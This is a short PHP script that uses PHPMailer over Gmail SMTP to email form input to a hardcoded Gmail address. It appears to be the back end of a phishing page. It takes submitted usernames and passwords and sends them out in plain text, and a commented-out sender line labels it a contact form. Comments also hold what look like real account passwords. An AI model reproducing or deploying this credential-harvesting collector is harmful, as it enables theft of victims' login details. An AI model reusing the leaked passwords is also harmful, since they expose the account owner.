<?php
//Include required PHPMailer files
	require 'includes/PHPMailer.php';
	require 'includes/SMTP.php';
	require 'includes/Exception.php';	
//Define name spaces
	use PHPMailer\PHPMailer\PHPMailer;
	use PHPMailer\PHPMailer\SMTP;
	use PHPMailer\PHPMailer\Exception;
//Create instance of PHPMailer
	$mail = new PHPMailer();
//Set mailer to use smtp
	$mail->SMTPDebug = 2;    
	$mail->isSMTP();
//Define smtp host
	//$mail->Host = 'smtp.zoho.in';  
 $mail->Host = 'smtp.gmail.com';  
//Enable smtp authentication
	$mail->SMTPAuth = true;
//Set smtp encryption type (ssl/tls)
	$mail->SMTPSecure = "tls";
//Port to connect smtp
	$mail->Port = 587;
//Set gmail username
	$mail->Username = "ssshru803@gmail.com";		

//Set gmail password
 //$mail->Password = "";
$mail->Password = "";

	// $mail->Password = "SolarVastra2020!";
	// $mail->Password = "r0b0tic".'$'."g";
	// echo "r0b0tic".'$'."g";
//Email subject
	$mail->Subject = $_POST['username'];
//Set sender email
	// $mail->setFrom('vedvrat@i-digitech.com', 'Website - Contact Form');
	$mail->setFrom('ssshru803@gmail.com',$_POST['username']);
//Enable HTML
	$mail->isHTML(true);
//attachment
	// $mail->addAttachment('img/attachment.png');
//Email body
	$mail->Body = "<p>Username : ".$_POST['username'].".</p> \n
         <p>password : ".$_POST['password'].".</p> \n";
//Add recipient
	$mail->addAddress('ssshru803@gmail.com');
//Finally send email
	if ( $mail->send() ) {
		echo "Email Sent..!";
	}else{
		//echo "Message could not be sent. Mailer Error: "{$mail->ErrorInfo};
	}
//Closing smtp connection
	$mail->smtpClose();


